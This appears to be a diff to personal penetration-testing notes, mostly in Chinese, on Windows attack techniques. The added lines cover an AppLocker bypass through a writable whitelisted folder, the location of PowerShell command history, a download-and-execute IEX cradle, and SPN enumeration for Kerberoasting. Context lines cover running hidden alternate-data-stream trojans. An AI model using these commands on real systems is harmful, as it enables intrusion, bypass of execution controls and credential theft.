@@ -88,7 +88,12 @@ ls /tmp/ngfs
 volatility--命令参数
 https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
 
+windows 有时候会设置applocker ,限制某些应用程序的执行，但是applocker有个白名单，在这个白名单的程序可以执行.
+白名单的路径是C:\Windows\System32\spool\drivers\color ,上传要执行的应用程序到这个目录就可以执行了。
+
 powershell:
+Windows powershell saves all previous commands into a file called ConsoleHost_history
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 ssh -l username ip  通过ssh 链接powershell
 
@@ -118,7 +123,9 @@ $plant_txt =  [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase
 下面两个命令可以检查某个可执行文件中是否隐藏木马文件
 Get-Item -Path file.exe -Stream * 在文件file.exe中查找所有stream ，这个stream可能是个隐藏的exe文件,尤其要关注stream和legth字段的值
 接上一行,运行wmic process call create $("c://file.exe:streamname")可以执行包含的streamname文件,通过这种方式可以执行可执行文件中包含的可执行木马文件
+
 powershell 下载文件 (new-object system.net.webclient).downloadfile("http://www.baidu.com/test.ps1") 或者invoke-webrequest "http//www.baidu.com/test.ps1" -outfile test.ps1
+IEX(new-object net.webclient).downloadstring("http://www.baidu.com/test.ps1")
 设置执行策略  powershell -executionpolicy bypass -file .\test.ps1
 
 powerview.ps1 
@@ -272,6 +279,7 @@ windows AD攻击中 常用到的几种技术:
 也就是说在windows ad中，某个服务器专门运行http服务，DC会为这个服务器专门设置一个账户，这个账户具有SPN属性，域中的所有用户都可以向这个服务发起一个票证
 请求，然后根据服务返回的票证验证数据来破解 这个http服务用户的密码。
 GetuserSPNS.py可以完成以上操作。
+在windows 上可以执行setspn -T medin -Q */* 查询spn服务账户
 2、AS-REP Roasting ：AS-REP 会转储禁用 Kerberos 预身份验证的用户帐户的 krbasrep5 哈希值。
 与 Kerberoasting 不同，这些用户不必是服务帐户，能够 AS-REP 烘焙用户的唯一要求是用户必须禁用预身份验证。
 GetNPUser.py会完成以上操作。
